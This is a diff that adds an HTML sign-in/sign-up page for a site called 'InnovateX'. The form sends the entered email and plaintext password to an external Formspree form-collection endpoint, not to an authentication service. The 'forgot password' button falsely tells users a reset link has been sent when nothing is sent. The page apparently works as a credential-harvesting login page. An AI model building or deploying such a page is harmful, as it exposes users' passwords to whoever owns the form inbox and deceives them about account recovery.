@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign In / Sign Up - InnovateX</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #f4f4f9;
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+    .form-container {
+      background-color: white;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+    .form-container h2 {
+      margin-bottom: 1.5rem;
+      color: #1a73e8;
+    }
+    .form-group {
+      margin-bottom: 1.5rem;
+      text-align: left;
+    }
+    .form-container input {
+      width: 100%;
+      padding: 0.75rem;
+      margin: 0.5rem 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+    .form-container input:focus {
+      border-color: #1a73e8;
+      outline: none;
+      box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+    }
+    .form-container button {
+      background-color: #1a73e8;
+      color: white;
+      padding: 0.75rem 1.5rem;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 1rem;
+      transition: background-color 0.3s;
+    }
+    .form-container button:hover {
+      background-color: #1557b0;
+    }
+    .forgot-password {
+      display: block;
+      margin-top: 1rem;
+      color: #1a73e8;
+      text-decoration: none;
+      font-size: 0.9rem;
+    }
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      justify-content: center;
+      align-items: center;
+    }
+    .modal-content {
+      background: white;
+      padding: 2rem;
+      border-radius: 5px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <h2>Sign In / Sign Up</h2>
+    
+    <!-- FORM NOW USES FORMSPREE ACTION -->
+    <form id="signin-form" action="https://formspree.io/f/mzzdkvbl" method="POST">
+      <div class="form-group">
+        <input type="email" 
+               id="email" 
+               name="email"
+               placeholder="Email" 
+               required
+               autocomplete="email">
+      </div>
+      <div class="form-group">
+        <input type="password" 
+               id="password" 
+               name="password"
+               placeholder="Password" 
+               required
+               autocomplete="current-password">
+      </div>
+      <button type="submit">Sign In / Sign Up</button>
+    </form>
+
+    <a href="#" class="forgot-password" onclick="handleForgotPassword()">Forgot your password?</a>
+  </div>
+
+  <!-- Password Recovery Modal -->
+  <div id="recoveryModal" class="modal">
+    <div class="modal-content">
+      <h3>Password Recovery</h3>
+      <p>If this email exists in our system, a reset link has been sent.</p>
+      <button onclick="closeModal()">OK</button>
+    </div>
+  </div>
+
+  <script>
+    // Show password recovery message
+    function handleForgotPassword() {
+      const email = document.getElementById('email').value;
+      if (email) {
+        showModal();
+      } else {
+        alert('Please enter your email address first.');
+      }
+    }
+
+    // Show modal
+    function showModal() {
+      document.getElementById('recoveryModal').style.display = 'flex';
+    }
+
+    // Close modal
+    function closeModal() {
+      document.getElementById('recoveryModal').style.display = 'none';
+    }
+  </script>
+</body>
+</html>
